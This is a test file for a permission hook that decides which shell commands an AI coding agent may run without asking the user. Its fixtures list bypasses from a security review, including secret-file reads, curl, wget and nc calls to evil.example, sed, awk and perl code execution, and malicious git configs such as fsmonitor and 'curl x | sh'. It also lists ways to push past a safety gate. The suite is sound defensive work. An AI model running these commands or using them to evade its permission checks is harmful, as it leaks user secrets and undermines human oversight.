// Read-only calls allowed without asking (core/auto-allow.ts, hooks/guard/auto-allow.mjs): which
// commands and file reads only read, and which prompts Kiko may answer itself at all. It fails
// closed (the 2026-11-19 security review): every bypass the review found (C1-C3, H1, H2, M4) is here
// and must ask, next to the ordinary reads agents run, which must still be allowed. Nothing here
// runs a shell or git: the commands are only read, and the repos are plain files. (The safety
// gate's side of the same review: guard.test.ts, "not blinded".)
import "../../setup.ts";
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { describe, test } from "node:test";
import { commandReadOnly, lex, readOnlyCall, secretIn } from "../../../hooks/guard/auto-allow.mjs";
import { HookHeld, type HookEvent } from "../../../src/agents/claude-code/hooks.ts";
import { CodexHeld, type CodexEvent } from "../../../src/agents/codex/hooks.ts";
import { readOnlyAllowed } from "../../../src/core/auto-allow.ts";
import { forgetPending, noteGuard } from "../../../src/core/guard.ts";
import { QUICK_CHECK_ID } from "../../../src/core/quick-ask.ts";

/** A folder holding `files` (name → its text; null: a folder). */
function folder(files: Record<string, string | null>, at = mkdtempSync(join(tmpdir(), "aa-"))) {
  for (const [name, text] of Object.entries(files)) {
    const path = join(at, name);
    mkdirSync(text === null ? path : dirname(path), { recursive: true });
    if (text !== null) writeFileSync(path, text);
  }
  return at;
}

/** A checkout (its .git as plain files) whose config is `config`, with these hooks and other files. */
const repo = (config: string, files: Record<string, string | null> = {}, at?: string) =>
  folder({ ".git/HEAD": "ref: refs/heads/main\n", ".git/config": config, ".git/objects": null, ".git/refs": null, ...files }, at);

const OUTSIDE = folder({ "secret.txt": "token", "notes.md": "" });
/** The session's project, with the files agents read and what an attacker's repo could ship. */
const PROJECT = repo('[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote "origin"]\n\turl = git@github.com:me/x.git\n', {
  "README.md": "# x",
  "package.json": "{}",
  "notes.txt": "",
  "data.txt": "",
  "src/main.ts": "",
  "src/lib/a.ts": "",
  docs: null,
  ".env": "KEY=1",
  ".env.local": "KEY=1",
  "config/server.pem": "",
  "config/id_ed25519": "",
  // File names that a glob turns into flags (C3).
  "--pre=sh": "",
  "--output=x": "",
  // A bare repo shipped as plain files (H1): git -C, --git-dir, or a cd into it runs its config.
  "vendor/evil/HEAD": "ref: refs/heads/main\n",
  "vendor/evil/config": '[core]\n\tbare = true\n\tworktree = ../..\n\tfsmonitor = "touch pwned"\n',
  "vendor/evil/objects": null,
  "vendor/evil/refs": null,
});
// Links inside the project to what's outside it (a repo can commit them).
symlinkSync(join(OUTSIDE, "secret.txt"), join(PROJECT, "docs/leak.txt"));
symlinkSync(OUTSIDE, join(PROJECT, "elsewhere"));
// A folder named as zsh's folder stack (`cd +0` stays put there).
mkdirSync(join(PROJECT, "+0"));
folder({ "a/x": "", "b/x": "" }, join(PROJECT, "cmp"));
/** A project with nothing of an attacker's or secret in it: where everyday reads are checked. */
const CLEAN = repo("[core]\n\tbare = false\n", {
  "README.md": "# x",
  "package.json": "{}",
  "notes.txt": "",
  "data.txt": "",
  "src/main.ts": "",
  "src/lib/a.ts": "",
  "src/secret.ts": "",
  docs: null,
  ".env.example": "KEY=",
});

const reads = (command: string, cwd: string | undefined = PROJECT) => commandReadOnly(command, cwd);

// The six prompts one question about a release brought in a minute on 2026-11-12 (logs, 01:53:37 to
// 01:54:33, in acceptEdits), as written but for the home folder's name. They only read, but each has
// $(…), 2>/dev/null, a glob, curl or another project's folder in it: they ask now.
const RELEASE_CHECK = [
  "ls *.md; git tag --sort=-creatordate | head -5; git log -1 --format='%h %cd' --date=short $(git tag --sort=-creatordate | head -1) 2>/dev/null; git log --oneline $(git tag --sort=-creatordate | head -1)..HEAD | wc -l; git status -sb | head -1",
  `grep -n "version" package.json | head -3; ls dist release* 2>/dev/null | head; grep -rn "0\\.3\\." RELEASING.md | head -5; git log --oneline -15 --grep -i "release\\|bump\\|v0\\." `,
  "git log --oneline -i -E --grep='release|0\\.3\\.' -12; echo ---; git branch -a --list '*beta*' '*invite*'; git log --oneline -3 --all --grep='token' -i; echo ---; curl -fsS -m 10 https://kiko.sh/releases/latest.json 2>&1 | head -c 600; echo; ls /Users/me/git | grep -i kiko",
  `git branch -a --contains df264b4a | head; git merge-base --is-ancestor df264b4a main && echo "in main" || echo "NOT in main"; git log -1 --format='%cd' --date=short df264b4a; git log ecd54f0a..main --oneline | wc -l; cd ../web-site && git log --oneline -3 && git branch --list | head; grep -n -i -A12 "rollout" RELEASES.md 2>/dev/null | head -30`,
  `cd /Users/me/git/web-site && git branch --merged main | tr '\\n' ' '; echo; git log --oneline -1 --grep -i 'invite'; git status -sb | head -1; curl -s -o /dev/null -w "i/<bad token>: %{http_code}\\n" -m 10 https://kiko.sh/i/notarealtoken; curl -s -m 10 https://kiko.sh/i/notarealtoken | head -c 300; echo; cd ../server && git log --oneline -3 && git status -sb | head -1`,
  `cd /Users/me/git/web-site && grep -n "RELEASES_GATED" wrangler.jsonc; curl -s -o /dev/null -w "latest.json without token: %{http_code}\\n" -m 10 https://kiko.sh/releases/latest.json; cd ../kiko && grep -n -i -m8 "release\\|0\\.3\\.2\\|blocker\\|before ship" TODO.md | head -12`,
];

// What agents really run, from the project's folder: these must stay allowed, or the setting is
// worth nothing.
const READS = [
  "ls",
  "ls -la",
  "ls -la src docs",
  "ls -1 src | wc -l",
  "cat README.md",
  "cat README.md | head -20",
  "cat -n src/main.ts",
  "head -n 20 notes.txt",
  "head -20 notes.txt",
  "tail -n 50 notes.txt",
  "wc -l notes.txt data.txt",
  "pwd",
  "which node",
  "which -a pnpm node",
  "echo ---",
  "echo hello world; pwd",
  "date +%Y-%m-%d; pwd; which node",
  "git status",
  "git status -sb",
  "git status --short",
  "git status --porcelain",
  "git status -uno",
  "git log --oneline -5",
  "git log --oneline -n 10",
  "git log -1 --format='%h %cd' --date=short",
  "git log --oneline --graph --all -20",
  "git log --since='2 weeks ago' --author=me --oneline",
  "git log -p -2 -- src/main.ts",
  "git diff",
  "git diff --stat",
  "git diff --cached",
  "git diff HEAD~1 --stat",
  "git diff main..HEAD -- src",
  "git show HEAD --stat",
  "git show --name-only HEAD~2",
  "git rev-parse --abbrev-ref HEAD",
  "git rev-parse --show-toplevel",
  "git branch",
  "git branch -vv",
  "git branch -a --list 'feat/*'",
  "git branch --merged main",
  "git tag -l 'v0.*'",
  "git tag --sort=-creatordate",
  "git describe --tags",
  "git remote -v",
  "git ls-files | wc -l",
  "git blame -L 1,5 README.md",
  "git shortlog -sn",
  "git config --get remote.origin.url",
  "git stash list",
  "git merge-base --is-ancestor main HEAD && echo in || echo out",
  "git status --short && git log --oneline | head -5 && git remote -v",
  "git grep -n TODO",
  "git --no-pager log --oneline -3",
  "rg pattern src",
  "rg -n 'foo|bar' src --type ts",
  "rg -l TODO",
  "rg --files src",
  "rg -g '*.ts' TODO src",
  "grep -rn foo .",
  "grep -rn foo src",
  "grep -n 'version' package.json | head -3",
  "grep -c TODO src/main.ts",
  "grep -rIl -i -E 'a|b' --exclude-dir=node_modules .",
  "grep -e foo -e bar notes.txt",
  'grep -n "a\\|b" notes.txt',
  "find . -name '*.ts'",
  "find src -type f -name '*.ts' | wc -l",
  "find . -name '*.ts' -not -path './node_modules/*' | wc -l",
  "find . -maxdepth 2 -type d",
  "sed -n 1,20p notes.txt",
  "sed -n '5p' notes.txt",
  "jq '.version' package.json",
  "jq -r .name package.json",
  "du -sh src",
  "du -sh src docs; df -h",
  "stat -f '%Sm' package.json; file README.md",
  "test -d docs && echo yes",
  "cd src && ls -la",
  "cd ./src && cat main.ts | head -5",
  "ls src && wc -l src/main.ts",
  "sort data.txt | uniq -c",
  "cut -d, -f1 data.txt | sort -u",
  "tree -L 2 src",
  "diff notes.txt data.txt",
  "basename src/main.ts",
  "uname -a",
  "true",
  "ls -la\n\ngit status",
];

// Every bypass the review found (C1, C2, C3, H1, H2 and M4's), as written there but for paths: each must ask.
const BYPASSES: [string, string, RegExp][] = [
  // C1: $'…' (ANSI-C quoting) desynced the old parser: anything after it was allowed.
  ["C1", "echo $'\\'' ; touch /tmp/pwned ; echo '\\'''", /\$ expansion/],
  ["C1", "echo $'\\'' ; git push --force origin main ; echo '\\'''", /\$ expansion/],
  ["C1", 'echo $"x" ; ls', /\$ expansion/],
  // C2: zsh's =(…) and glob qualifiers run code.
  ["C2", "echo =(touch X)", /zsh runs it/],
  ["C2", "ls *(e:'touch X':)", /glob/],
  ["C2", "ls *(e:'git push --force':)", /glob/],
  ["C2", "cat =(git push origin main)", /zsh runs it/],
  ["C2", "ls src(e:'touch X':)", /brackets/],
  // C3: "read-only" commands that write or run.
  ["C3", "sed -n -e'w /tmp/x' README.md", /sed/],
  ["C3", "sed -n '1!w /tmp/x' README.md", /sed/],
  ["C3", "sed -n '1w out.txt' README.md", /sed/],
  ["C3", "sed 's/a/b/w out.txt' notes.txt", /sed/],
  ["C3", "sed -n '1e id' notes.txt", /sed/],
  ["C3", "sed -i '' s/a/b/ notes.txt", /sed/],
  ["C3", "printf -v PATH %s ./bin && ls", /printf -v/],
  ["C3", "printf -v PATH %s ./bin; ls", /printf -v/],
  ["C3", "tree -ao /tmp/x .", /tree -o/],
  ["C3", "tree -o x .", /tree -o/],
  ["C3", "tree -R -H . .", /tree -R/],
  ["C3", "rg foo *", /glob/],
  ["C3", "git diff *", /glob/],
  ["C3", "cat *", /starting with -/],
  ["C3", "ls *", /starting with -/],
  ["C3", "head -5 *=*", /starting with -/],
  ["C3", "wc -l *", /starting with -/],
  ["C3", "rg foo --pre=sh", /rg --pre/],
  ["C3", "rg --pre sh foo", /rg --pre/],
  ["C3", "rg --pre-glob '*' --pre sh foo", /rg --pre/],
  ["C3", "rg -z foo", /rg -z/],
  ["C3", "rg --search-zip foo", /rg --search-zip/],
  // H1: git running what a repo's config names.
  ["H1", "git -C vendor/evil status", /git -C/],
  ["H1", "git --git-dir=vendor/evil --work-tree=. status", /git --git-dir/],
  ["H1", "git --work-tree=. status", /git --work-tree/],
  ["H1", "cd vendor/evil && git status", /git after a cd/],
  ["H1", "git -c core.fsmonitor=x status", /git -c/],
  ["H1", "git --exec-path=. status", /git --exec-path/],
  ["H1", "git --config-env=core.pager=X log", /git --config-env/],
  ["H1", "git cat-file --filters HEAD:README.md", /git cat-file --filters/],
  ["H1", "git remote show origin", /git remote show/],
  ["H1", "git diff --ext-diff", /git diff --ext-diff/],
  ["H1", "git log -p --textconv", /git log --textconv/],
  ["H1", "git log --output=x", /git log --output/],
  ["H1", "git log --output x", /git log --output/],
  ["H1", "git log --show-signature", /git log --show-signature/],
  ["H1", "git ls-remote --upload-pack=x origin", /git ls-remote/],
  ["H1", "awk -e 'BEGIN{}' -e 'BEGIN{system(\"id\")}'", /awk isn't a known reader/],
  ["H1", "awk 'BEGIN{\"id\" |& getline}'", /awk isn't a known reader/],
  ["H1", "rg --hostname-bin=./evil foo", /rg --hostname-bin/],
  ["H1", "git log --format='%G?'", /signatures/],
  ["H1", "git log --pretty=format:%GS", /signatures/],
  ["H1", "git for-each-ref --format='%(signature)'", /signatures/],
  ["H1", "git reflog -n1 expire --all", /git reflog expire/],
  ["H1", "git reflog -n1 delete x", /git reflog delete/],
  ["H1", "git grep --untracked -e X", /git grep --untracked/],
  // H2: secrets read, then sent; quoting and escapes that hid them.
  ["H2", "cat ~/.s''sh/id''_rsa", /outside the project/],
  ["H2", "cat .e\\nv", /backslash/],
  ["H2", "cat $(find ~ -name 'i?_rsa')", /\$ expansion/],
  ["H2", "cat ~/.ssh/id_rsa", /outside the project/],
  ["H2", "grep -r BEGIN ~/.", /outside the project/],
  ["H2", "rg X ~/.", /outside the project/],
  ["H2", "cat ~/.codex/auth.json", /outside the project/],
  ["H2", "cat ~/.claude/.credentials.json", /outside the project/],
  ["H2", "cat /etc/passwd", /outside the project/],
  ["H2", "cat ../x/notes.md", /\.\. in it/],
  ["H2", "cat docs/leak.txt", /a link/],
  ["H2", "cat elsewhere/secret.txt", /a link/],
  ["H2", "cd ./elsewhere && cat notes.md", /a link/],
  // A link then .. : the kernel goes to the link's target's parent, which resolve() never sees.
  ["H2", "cat elsewhere/../notes.md", /\.\. in it/],
  ["H2", "ls elsewhere/..", /\.\. in it/],
  ["H2", "grep -r KEY elsewhere/..", /\.\. in it/],
  ["H2", "cd ./src && cat ../.env", /\.\. in it/],
  // zsh's `cd +0` stays put (its folder stack); bash's CDPATH may go elsewhere: no path after.
  ["H2", "cd +0 && cat notes.txt", /cd other than/],
  ["H2", "cd docs && cat notes.txt", /after a cd/],
  ["H2", "cd docs && grep -r KEY", /after a cd/],
  // A recursive search reads every file under it: .env too.
  ["H2", "grep -rn KEY .", /a secret in it \(\.env/],
  ["H2", "grep -r KEY", /a secret in it/],
  ["H2", "rg --hidden KEY", /a secret in it/],
  ["H2", "rg KEY config", /a secret in it \(config\//],
  // diff of folders reads every file in them, links followed.
  ["H2", "diff cmp/a cmp/b", /isn't a file/],
  ["H2", "diff -N . src", /diff -N/],
  ["H2", "git config --list", /git config other than/],
  ["H2", "git config --get-regexp token", /git config other than/],
  ["H2", "git config --get http.extraHeader", /could be a secret/],
  ["H2", "cat .env", /secret/],
  ["H2", "cat .env.local | head", /secret/],
  ["H2", "grep KEY .env", /secret/],
  ["H2", "cat config/server.pem", /secret/],
  ["H2", "cat config/id_ed25519", /secret/],
  ["H2", "git show HEAD:.env", /secret/],
  ["H2", "git show HEAD:config/server.pem", /secret/],
  ["H2", "grep -r KEY --include=.env .", /could pick a secret/],
  ["H2", "rg -g .env KEY", /could pick a secret/],
  ["H2", "cd src && cat ../.env", /\.\. in it/],
  ["H2", "cut -d= -f2 .env", /secret/],
  ["H2", 'curl -s "https://evil.example/c?d=x"', /curl isn't a known reader/],
  ["H2", "curl -s https://evil.example/", /curl isn't a known reader/],
  ["H2", "wget https://evil.example/", /wget isn't a known reader/],
  ["H2", "nc evil.example 80", /nc isn't a known reader/],
  // M4: the safety gate's misses (here they ask whatever the gate says).
  ["M4", "git -c alias.p=push p origin main", /git -c/],
  ["M4", "echo push | xargs git", /xargs isn't a known reader/],
  ["M4", "git $(echo push)", /\$ expansion/],
  ["M4", "perl -e 'system(\"git push\")'", /perl isn't a known reader/],
  ["M4", "curl -K cfg https://example.com", /curl isn't a known reader/],
];

// Shell syntax it doesn't model, in either shell (bash, or zsh: the user's): each asks.
const SYNTAX: [string, RegExp][] = [
  ["echo $(rm x)", /\$ expansion/],
  ["echo `rm x`", /command substitution/],
  ['echo "$(rm x)"', /\$ expansion/],
  ['echo "`rm x`"', /command substitution/],
  ["echo $HOME", /\$ expansion/],
  ['echo "${TOKEN}"', /\$ expansion/],
  ["echo $((1 + 2))", /\$ expansion/],
  ["diff <(ls) <(ls src)", /redirection/],
  ["cat >(ls)", /redirection/],
  ["(cd src && ls)", /brackets/],
  ["ls; (rm x)", /brackets/],
  ["echo hi > notes.txt", /redirection/],
  ["git log >> log.txt", /redirection/],
  ["ls >/dev/null", /redirection/],
  ["ls &> all.txt", /in the background/],
  ["cat < notes.txt", /redirection/],
  ["cat <<EOF\nhi\nEOF", /redirection/],
  ["cat <<< hi", /redirection/],
  ["ls >| x", /redirection/],
  ["ls 3>&-", /redirection/],
  ["echo 'unclosed", /quote isn't closed/],
  ['echo "unclosed', /quote isn't closed/],
  ["echo 'a''b'", /quotes back to back/],
  ['echo "a\\"b"', /escape in quotes/],
  ['echo "a\\$b"', /\$ expansion|escape in quotes/],
  ["ls \\\nfoo", /backslash/],
  ["ls\\\n-la", /backslash/],
  ["eval ls", /eval isn't a known reader/],
  ["exec ls", /exec isn't a known reader/],
  ["source ./env.sh", /source isn't a known reader/],
  [". ./env.sh", /isn't a known reader/],
  ["builtin ls", /builtin isn't a known reader/],
  ["command ls", /command isn't a known reader/],
  ["noglob ls", /noglob isn't a known reader/],
  ["FOO=1 git log", /sets FOO/],
  ["GIT_EXTERNAL_DIFF=rm git diff", /sets GIT_EXTERNAL_DIFF/],
  ["GIT_PAGER=sh git log", /sets GIT_PAGER/],
  ["PAGER=sh git log", /sets PAGER/],
  ["LESSOPEN='|sh %s' cat x", /sets LESSOPEN/],
  ["EDITOR=sh git log", /sets EDITOR/],
  ["alias ls=rm", /alias isn't a known reader/],
  ["f() { rm x; }; f", /brackets/],
  ["function f { ls; }", /braces/],
  ["ls {a,b}", /braces/],
  ["echo {1..3}", /braces/],
  ["ls [ab]", /glob/],
  ["echo a?", /a glob/],
  ["echo hi # rm -rf x", /a #/],
  ["ls a#", /a #/],
  ["ls ^x", /a \^/],
  ["! ls", /a !/],
  ['echo "hi!"', /a ! in quotes/],
  ["ls ~root", /isn't the home folder/],
  ["ls ~+", /isn't the home folder/],
  ["ls a=~/x", /~ inside a word/],
  ["=ls", /zsh runs it/],
  ["ls &", /in the background/],
  ["ls |& cat", /\|&/],
  ["ls ;; ls", /;;/],
  ["; ls", /no command/],
  ["ls |", /no command/],
  ["ls && && ls", /no command/],
  ["ls |\ncat", /no command/],
  ["ls  x", /character it doesn't read/],
  ["ls \u0007", /control character/],
  ["echo 'a\u001bb'", /control character/],
  ["./ls", /isn't a known reader/],
  ["/bin/ls", /isn't a known reader/],
  ["xargs cat", /xargs isn't a known reader/],
  ["env", /env isn't a known reader/],
  ["printenv", /printenv isn't a known reader/],
  ["set", /set isn't a known reader/],
  ["bash -c 'ls'", /bash isn't a known reader/],
  ["sh -c 'git status'", /sh isn't a known reader/],
  ["zsh -c ls", /zsh isn't a known reader/],
  ["", /no command/],
  ["   ", /no command/],
  [`ls ${"a".repeat(2001)}`, /too long/],
];

// Flags outside each reader's list, and readers with only some forms allowed.
const FLAGS: [string, RegExp][] = [
  ["find . -name x -exec rm {} \\;", /braces|backslash|find -exec/],
  ["find . -exec rm x ;", /find -exec/],
  ["find . -execdir ls ;", /find -execdir/],
  ["find . -ok rm ;", /find -ok/],
  ["find . -name '*.log' -delete", /find -delete/],
  ["find . -fprint out.txt", /find -fprint/],
  ["find . -fprintf out.txt x", /find -fprintf/],
  ["find -L . -name x", /find -L/],
  ["find /etc -name x", /outside the project/],
  ["grep -R foo .", /grep -R/],
  ["grep -rS foo .", /grep -S/],
  ["grep -f patterns.txt notes.txt", /grep -f/],
  ["grep -Z foo notes.txt", /grep -Z/],
  ["grep foo notes.txt -e /etc/passwd", /after its files/],
  ["rg -L foo", /rg -L/],
  ["rg --follow foo", /rg --follow/],
  ["rg -u foo", /rg -u/],
  ["rg --no-ignore foo", /rg --no-ignore/],
  ["rg -g '*.env' KEY", /could pick a secret/],
  ["rg -g '*' KEY", /could pick a secret/],
  ["rg --ignore-file x foo", /rg --ignore-file/],
  ["ls -w 80", /ls -w/],
  ["ls -T", /ls -T/],
  ["ls -L src", /ls -L/],
  ["ls --hide=x", /ls --hide/],
  ["cat --help", /cat --help/],
  ["head notes.txt -n /etc/passwd", /head -n/],
  ["tail -f notes.txt", /tail -f/],
  ["sort -o out.txt data.txt", /sort -o/],
  ["sort --compress-program=sh data.txt", /sort --compress-program/],
  ["sort -T /tmp data.txt", /sort -T/],
  ["uniq data.txt out.txt", /more than 1 file/],
  ["column notes.txt -s x", /after its files/],
  ["diff -r src docs", /diff -r/],
  ["diff -l a b", /diff -l/],
  ["file -C -m x", /file -C/],
  ["file -z x.gz", /file -z/],
  ["du -L src", /du -L/],
  ["df -T apfs", /df -T/],
  ["date -s 0101", /date -s/],
  ["date 010112002026", /date 0101/],
  ["stat -f %N /etc/passwd", /outside the project/],
  ["jq -n env", /environment/],
  ["jq '$ENV.HOME' package.json", /environment/],
  ["jq 'import \"x\" as x; .' package.json", /module/],
  ["jq --rawfile a /etc/passwd . package.json", /jq --rawfile/],
  ["jq -f prog.jq package.json", /jq -f/],
  ["test -d /etc", /outside the project/],
  ["test a = b", /zsh runs it/],
  ["test -n a b", /test other than/],
  ["cd /tmp && ls", /outside the project/],
  ["cd ~ && ls", /outside the project/],
  ["cd && ls", /cd other than/],
  ["cd - && ls", /cd other than/],
  ["cd nowhere && ls", /isn't there/],
  ["pwd x", /pwd x/],
  ["which -x node", /which -x/],
  ["tr a b notes.txt", /more than two sets/],
  ["printf", /no format/],
  ["printf -- '%s' x", /printf --/],
  ["git", /nothing to do/],
  ["git push", /git push/],
  ["git status && git push origin main", /git push/],
  ["git fetch", /git fetch/],
  ["git pull", /git pull/],
  ["git checkout main", /git checkout/],
  ["git stash", /git stash/],
  ["git stash drop", /git stash drop/],
  ["git branch new-feature", /git branch new-feature/],
  ["git branch -D old", /git branch -D/],
  ["git branch -m old new", /git branch -m/],
  ["git tag v1.0", /git tag v1.0/],
  ["git tag -d v1.0", /git tag -d/],
  ["git config user.name me", /git config other than/],
  ["git config --global --list", /git config other than/],
  ["git remote add origin x", /git remote add/],
  ["git reflog expire --all", /git reflog expire/],
  ["git worktree add x", /git worktree add/],
  ["git diff --no-index /etc/passwd x", /git diff --no-index/],
  ["git grep -O foo", /git grep -O/],
  ["git grep --open-files-in-pager foo", /git grep --open-files-in-pager/],
  ["git log -- ~/.ssh", /outside the project/],
  ["git log --format=%h ../other", /\.\. in it/],
  ["git -p log", /git -p/],
  ["git --paginate log", /git --paginate/],
  ["git --bare log", /git --bare/],
  ["git --namespace=x log", /git --namespace/],
  ["git --upload-pack=x log", /git --upload-pack/],
  ["git blame --contents /etc/passwd x", /git blame --contents/],
  ["git cat-file -p -t HEAD", /git cat-file other than/],
  ["git cat-file --batch", /git cat-file --batch/],
];

describe("auto-allow: what agents really run is allowed", () => {
  test("everyday reads in the session's folder", () => {
    for (const command of READS) assert.equal(reads(command, CLEAN).readOnly, true, `${JSON.stringify(command)}: ${reads(command, CLEAN).why}`);
  });

  test("why says which readers", () => {
    assert.equal(reads("git status --short && git log --oneline | head -5 && git remote -v", CLEAN).why, "git status, git log, head, git remote");
    assert.equal(reads("ls -la; cat README.md | wc -l", CLEAN).why, "ls, cat, wc");
  });

  test("with no folder known: relative paths only, no cd, no git", () => {
    for (const cwd of [undefined, "", "relative/dir"]) {
      const r = (command: string) => commandReadOnly(command, cwd);
      assert.equal(r("cat README.md").readOnly, true, String(cwd));
      assert.equal(r("ls -la src | head").readOnly, true, String(cwd));
      assert.match(r("cat /etc/hosts").why, /outside the project/);
      assert.match(r("cat ~/notes.txt").why, /outside the project/);
      assert.match(r("cat ../notes.txt").why, /\.\. in it/);
      assert.match(r("cat .env").why, /secret/);
      assert.match(r("git status").why, /folder unknown/);
      assert.match(r("cd src && ls").why, /folder unknown/);
    }
  });

  test("a session started in the home folder (or above it) has no paths allowed", () => {
    for (const cwd of [homedir(), "/", "/Users"]) {
      assert.match(reads("cat notes.txt", cwd).why, /home folder/, cwd);
      assert.match(reads("grep -r KEY .", cwd).why, /home folder/, cwd);
      assert.match(reads("rg KEY", cwd).why, /home folder/, cwd);
      assert.match(reads("find . -name x", cwd).why, /home folder/, cwd);
      assert.equal(reads("pwd", cwd).readOnly, true, cwd);
    }
  });
});

describe("auto-allow: it fails closed", () => {
  test("every bypass from the 2026-11-19 review asks", () => {
    for (const [id, command, why] of BYPASSES) {
      const r = reads(command);
      assert.equal(r.readOnly, false, `${id} ${command} should ask`);
      assert.match(r.why, why, `${id} ${command}: ${r.why}`);
    }
  });

  test("shell syntax it doesn't model asks, whatever it means in bash or zsh", () => {
    for (const [command, why] of SYNTAX) {
      const r = reads(command);
      assert.equal(r.readOnly, false, `${JSON.stringify(command)} should ask`);
      assert.match(r.why, why, `${JSON.stringify(command)}: ${r.why}`);
    }
  });

  test("a flag outside a reader's list asks", () => {
    for (const [command, why] of FLAGS) {
      const r = reads(command);
      assert.equal(r.readOnly, false, `${command} should ask`);
      assert.match(r.why, why, `${command}: ${r.why}`);
    }
  });

  test("the six release-check prompts of 2026-11-12 ask now", () => {
    for (const command of RELEASE_CHECK) assert.equal(reads(command, "/Users/me/git/kiko").readOnly, false, command);
  });

  test("not a string: asks", () => {
    for (const command of [undefined, null, 3, ["ls"]]) assert.equal(commandReadOnly(command, PROJECT).readOnly, false);
  });

  test("the lexer: words with their quotes off, the operators between commands", () => {
    assert.deepEqual(
      lex(`grep -n "a|b" 'c d' x && ls; git log\npwd | wc -l`).commands?.map((c) => c.map((w) => w.text)),
      [["grep", "-n", "a|b", "c d", "x"], ["ls"], ["git", "log"], ["pwd"], ["wc", "-l"]],
    );
    assert.deepEqual(
      lex("ls ~/x a~1").commands?.[0].map((w) => [w.text, w.tilde]),
      [
        ["ls", false],
        ["~/x", true],
        ["a~1", false],
      ],
    );
    // In double quotes a backslash before anything but $ ` " \ and a newline is itself.
    assert.equal(lex('grep "a\\|b" x').commands?.[0][1].text, "a\\|b");
  });
});

describe("auto-allow: git only in the session's own, plain checkout", () => {
  test("a repo whose own config runs something on a read asks", () => {
    for (const [config, why] of [
      ["[core]\n\tfsmonitor = touch pwned\n", /core.fsmonitor/],
      ['[core]\n\tfsMonitor = "curl x | sh"\n', /core.fsmonitor/],
      ["[diff]\n\texternal = ./x.sh\n", /diff.external/],
      ['[diff "evil"]\n\ttextconv = sh\n', /textconv/],
      ["[diff.evil]\n\ttextconv = sh\n", /textconv/],
      ['[filter "x"]\n\tclean = sh\n', /filter/],
      ['[filter "x"]\n\tprocess = sh\n', /filter/],
      ["[gpg]\n\tprogram = ./x\n", /gpg.program/],
      ['[gpg "ssh"]\n\tprogram = ./x\n', /gpg/],
      ["[log]\n\tshowSignature = true\n", /signatures/],
      ["[core]\n\tpager = sh -c x\n", /core.pager/],
      ["[pager]\n\tlog = sh -c x\n", /pager.log/],
      ["[include]\n\tpath = ../x\n", /includes/],
      ['[includeIf "gitdir:/"]\n\tpath = ../x\n', /includes/],
      ["[core] fsmonitor = x\n", /can't be read/],
      // A ; inside quotes is the value's, not a comment: git runs this.
      ['[core]\n\tfsmonitor = "true;touch M1"\n', /core.fsmonitor/],
      ['[filter "lfs"]\n\tclean = "git-lfs clean;touch M"\n', /filter/],
      ['[core]\n\thooksPath = "h;x"\n', /hooks it can't read/],
      ["[core]\n\tfsmonitor = true \\\n", /can't be read/],
      ["[core]\n\tworktree = /elsewhere\n", /core.worktree/],
      ["[gpg]\n\tformat = x509\n", /gpg/],
    ] as const) {
      const r = reads("git status", repo(config));
      assert.equal(r.readOnly, false, config);
      assert.match(r.why, why, `${config}: ${r.why}`);
    }
  });

  test("a post-index-change hook (git status may write the index) asks, in .git/hooks or core.hooksPath", () => {
    assert.match(reads("git status", repo("[core]\n\tbare = false\n", { ".git/hooks/post-index-change": "#!/bin/sh\n" })).why, /post-index-change/);
    const husky = repo("[core]\n\thooksPath = .husky\n", { ".husky/pre-commit": "#!/bin/sh\n" });
    assert.equal(reads("git status", husky).readOnly, true, "a hooks folder with no post-index-change");
    folder({ ".husky/post-index-change": "#!/bin/sh\n" }, husky);
    assert.match(reads("git status", husky).why, /post-index-change/);
  });

  test("an ordinary config is fine: remotes, branches, lfs, fsmonitor on", () => {
    const plain = repo(
      '[core]\n\tbare = false\n\tfsmonitor = true\n[remote "origin"]\n\turl = git@github.com:me/x.git\n[branch "main"]\n\tremote = origin\n[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tprocess = git-lfs filter-process\n; a comment\n',
    );
    assert.equal(reads("git status && git diff --stat", plain).readOnly, true, reads("git status", plain).why);
  });

  test("a bare repo found before any .git (a folder with HEAD, objects, refs) asks", () => {
    assert.match(reads("git status", join(PROJECT, "vendor/evil")).why, /bare repository/);
    // Or HEAD and a commondir only (git takes it as a repo too).
    assert.match(reads("git status", folder({ HEAD: "ref: refs/heads/main\n", commondir: "../real\n" })).why, /bare repository/);
  });

  test("a .git folder's commondir is followed; a .git git wouldn't take asks (git would look further up)", () => {
    const real = repo("[core]\n\tfsmonitor = touch M2\n");
    const linked = folder({ ".git/HEAD": "ref: refs/heads/main\n", ".git/commondir": `${join(real, ".git")}\n` });
    assert.match(reads("git status", linked).why, /core.fsmonitor/);
    const parent = repo("[core]\n\tfsmonitor = touch M3\n");
    mkdirSync(join(parent, "proj/.git"), { recursive: true });
    assert.match(reads("git status", join(parent, "proj")).why, /isn't a repository/);
  });

  test("a submodule's config is read too (git status runs git in it)", () => {
    const sup = repo("[core]\n\tbare = false\n", { ".git/modules/lib/config": "[core]\n\tfsmonitor = touch M4\n", ".git/modules/lib/HEAD": "" });
    assert.match(reads("git status", sup).why, /a submodule: the repo's config runs core.fsmonitor/);
  });

  test("a worktree's .git file: its main repo's config is the one read", () => {
    const main = repo("[core]\n\tfsmonitor = sh\n");
    folder({ commondir: "../..\n", HEAD: "ref: refs/heads/w\n" }, join(main, ".git/worktrees/w"));
    const wt = folder({ ".git": `gitdir: ${join(main, ".git/worktrees/w")}\n` });
    assert.match(reads("git status", wt).why, /core.fsmonitor/);
  });
});

// The user's three loosenings of 2026-11-19 (replaying their real prompts, the fail-closed rules
// allowed none): a last 2>/dev/null or 2>&1, other projects' files under ~/git, and globs as ls,
// cat, head and wc's files. Each next to what must still ask. ~/git is a fake home's here.
describe("auto-allow: stderr thrown away or joined to stdout", () => {
  test("a last 2>/dev/null, 2> /dev/null or 2>&1 on each command is allowed", () => {
    for (const command of [
      "ls 2>/dev/null",
      "ls 2>&1",
      "ls 2> /dev/null",
      "ls docs 2>/dev/null && echo yes",
      "git log --oneline -3 2>&1 | head -3",
      "cat README.md 2>/dev/null | head -5; git status -sb 2>&1",
      "ls -la 2>/dev/null\npwd",
      "ls 2>&1|wc -l",
      "ls 2>/dev/null;pwd",
    ])
      assert.equal(reads(command, CLEAN).readOnly, true, `${JSON.stringify(command)}: ${reads(command, CLEAN).why}`);
    assert.deepEqual(
      lex("ls -la 2>/dev/null | head 2>&1").commands?.map((c) => c.map((w) => w.text)),
